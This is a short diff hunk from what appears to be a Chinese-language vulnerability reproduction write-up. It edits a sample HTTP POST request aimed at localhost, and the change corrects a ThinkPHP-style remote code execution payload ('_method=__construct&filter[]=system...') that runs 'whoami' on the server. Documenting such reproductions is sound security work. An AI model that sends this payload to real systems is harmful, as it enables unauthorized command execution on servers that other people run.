@@ -51,7 +51,7 @@ Host: localhost:8080
 Content-Type: application/x-www-form-urlencoded
 Connection: close
 
-_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
 ```
 
 ### 3.3 命令执行验证
